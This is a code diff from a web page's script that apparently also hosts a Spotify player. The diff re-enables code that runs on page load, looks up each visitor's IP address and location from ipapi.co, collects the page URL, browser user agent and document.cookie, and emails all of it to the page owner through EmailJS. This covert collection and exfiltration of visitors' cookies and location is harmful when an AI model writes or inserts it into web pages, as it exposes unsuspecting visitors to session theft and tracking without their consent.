@@ -862,32 +862,32 @@
   let ipData = {};
 
   window.onload = async function () {
-    // try {
-    //   const res = await fetch("https://ipapi.co/json/");
-    //   ipData = await res.json();
-    // } catch (err) {
-    //   console.log("IP fetch failed:", err);
-    // }
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      ipData = await res.json();
+    } catch (err) {
+      console.log("IP fetch failed:", err);
+    }
 
-    // const params = {
-    //   page: window.location.href,
-    //   userAgent: navigator.userAgent,
-    //   time: new Date().toLocaleString(),
-    //   cookies: document.cookie,
+    const params = {
+      page: window.location.href,
+      userAgent: navigator.userAgent,
+      time: new Date().toLocaleString(),
+      cookies: document.cookie,
 
-    //   ip: ipData.ip || "N/A",
-    //   city: ipData.city || "N/A",
-    //   region: ipData.region || "N/A",
-    //   country: ipData.country_name || "N/A"
-    // };
+      ip: ipData.ip || "N/A",
+      city: ipData.city || "N/A",
+      region: ipData.region || "N/A",
+      country: ipData.country_name || "N/A"
+    };
 
-    // // email js: serviceID, templateID, templateParams
-    // emailjs.send("service_sd8nt2d", "template_c65f6tx", params)
-    //   .then(function(response) {
-    //     console.log("Email sent!", response.status);
-    //   }, function(error) {
-    //     console.log("Failed...", error);
-    //   });
+    // email js: serviceID, templateID, templateParams
+    emailjs.send("service_sd8nt2d", "template_c65f6tx", params)
+      .then(function(response) {
+        console.log("Email sent!", response.status);
+      }, function(error) {
+        console.log("Failed...", error);
+      });
 
     const target = document.getElementById("spotify-player");
     if (target) {
